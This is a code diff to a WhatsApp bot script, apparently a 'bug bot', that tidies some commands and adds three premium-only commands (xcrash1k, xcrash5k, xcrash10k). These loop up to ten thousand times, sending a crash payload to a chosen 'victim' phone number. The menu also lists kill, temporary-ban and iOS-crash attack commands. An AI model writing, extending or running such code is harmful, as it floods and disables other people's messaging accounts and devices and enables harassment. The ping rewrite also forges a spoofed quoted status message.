@@ -401,21 +401,22 @@ senddocu(buffer)
                     replygcxeon("Success")
                 }
                 break
-            case 'listprem': {
-                if (!isCreator) return replygcxeon(mess.owner)
-                let data = require("./database/premium.json")
-                let txt = `*------「 LIST PREMIUM 」------*\n\n`
-                for (let i of data) {
-                    txt += `Number : ${i.id}\n`
-                    txt += `Expired : ${i.expired} Second\n`         
-                }                
-                XeonBotInc.sendMessage(m.chat, {
-                    text: txt,
-                    mentions: i
-                }, {
-                    quoted: m
-                })
-            }
+                case 'listprem': {
+                    if (!isCreator) return replygcxeon(mess.owner)
+                                let data = require("./database/premium.json")
+                                let txt = `*------「 LIST PREMIUM 」------*\n\n`
+                                for (let x of data) {
+                                    txt += `Number : ${x.id}\n`
+                                    txt += `Expire In: ${x.expired} ms\n`
+                                XeonBotInc.sendMessage(m.chat, {
+                                    text: txt,
+                                    mentions: x
+                                }, {
+                                    quoted: m
+                                })
+                                }
+                            }
+                            break
             break
             case 'deletesession':
             case 'delsession':
@@ -907,70 +908,24 @@ senddocu(buffer)
                     }).catch((err) => replygcxeon(json(err)))
                 break
                 case 'p':
-            case 'ping':{
-                const used = process.memoryUsage()
-                const cpus = os.cpus().map(cpu => {
-                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
-                    return cpu
-                })
-                const cpu = cpus.reduce((last, cpu, _, {
-                    length
-                }) => {
-                    last.total += cpu.total
-                    last.speed += cpu.speed / length
-                    last.times.user += cpu.times.user
-                    last.times.nice += cpu.times.nice
-                    last.times.sys += cpu.times.sys
-                    last.times.idle += cpu.times.idle
-                    last.times.irq += cpu.times.irq
-                    return last
-                }, {
-                    speed: 0,
-                    total: 0,
-                    times: {
-                        user: 0,
-                        nice: 0,
-                        sys: 0,
-                        idle: 0,
-                        irq: 0
-                    }
-                })
-                let timestamp = speed()
-                let latensi = speed() - timestamp
-                neww = performance.now()
-                oldd = performance.now()
-                respon = `
-Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
-
-💻 Info Server
-RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
-
-_NodeJS Memory Usaage_
-${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
-
-${cpus[0] ? `_Total CPU Usage_
-${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
-_CPU Core(s) Usage (${cpus.length} Core CPU)_
-${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
-`.trim()
-                await XeonBotInc.sendMessage(m.chat, {
-                    text: respon,
-                    contextInfo: {
-                        externalAdReply: {
-                            showAdAttribution: true,
-                            title: `${botname}`,
-                            body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
-                            sourceUrl: global.link,
-                            mediaType: 1,
-                            renderLargerThumbnail: true
-                        }
-                    }
-                }, {
-                    quoted: m
-                })
-            }
-            break
+                    case 'ping': case 'botstatus': case 'statusbot': case 'p':
+                        let fgg = { key: { fromMe: true, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' }, message: { contactMessage: { displayName: `꧁﴿.·»✥«·-𝕯𝕯 𝕮𝖍𝖊𝖊𝖒𝖘-𝕭𝖔𝖙-·»✥«.·﴾꧂\n 😎😎===================================😎😎\n Created by: ${ownername}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'CHEEMS-BOT'\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
+                        let timestampe = speed()
+                        let latensie = speed() - timestampe
+                         let ping = `> 📌 Hey there, 🤗
+        > ${botname} 
+        > is online 📡🛰️
+        > 📌 ʀᴇsᴘᴏɴsᴇ sᴘᴇᴇᴅ :  ${latensie.toFixed(4)} ms 🏃
+        > 📌 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}⏰
+        >  
+        > 📌 ᴄʀᴇᴀᴛᴇᴅ ʙʏ : ${ownername} 👑`
+        
+                        XeonBotInc.sendMessage(m.chat, {
+                            text: ping,
+                        }, {
+                            quoted: fgg
+                        })
+                        break
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
@@ -982,7 +937,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/2a2d90f0705d84ed1b654.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1002,7 +957,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `FORGET DONATE`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/2a2d90f0705d84ed1b654.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1022,7 +977,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `SCRIPT OF ${botname} is on YouTube @DGXeon`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/2a2d90f0705d84ed1b654.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -2128,6 +2083,42 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 }
 break
+case 'xcrash1k':{
+    if (!isPremium) return replygcxeon(mess.prem)
+     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+     victim = text.split("|")[0]+'@s.whatsapp.net'
+    amount = "1000"
+    for (let i = 0; i < amount; i++) {
+    XeonyCrashy(pushname,victim)
+    await sleep(3000)
+    }
+    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+    }
+    break
+    case 'xcrash10k':{
+        if (!isPremium) return replygcxeon(mess.prem)
+         if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+         victim = text.split("|")[0]+'@s.whatsapp.net'
+        amount = "10000"
+        for (let i = 0; i < amount; i++) {
+        XeonyCrashy(pushname,victim)
+        await sleep(3000)
+        }
+        replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+        }
+        break
+        case 'xcrash5k':{
+            if (!isPremium) return replygcxeon(mess.prem)
+             if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+             victim = text.split("|")[0]+'@s.whatsapp.net'
+            amount = "5000"
+            for (let i = 0; i < amount; i++) {
+            XeonyCrashy(pushname,victim)
+            await sleep(3000)
+            }
+            replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+            }
+            break
 case 'xcrash2':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
@@ -2493,6 +2484,9 @@ xkill2 <amount>
 xkillgc <link group>
 tempban <code|number>
 xcrash <number>
+xcrash1k <number>
+xcrash5k <number>
+xcrash10k <number>
 xcrash2 <amount>
 xioscrash <number>
 xioscrash2 <amount>
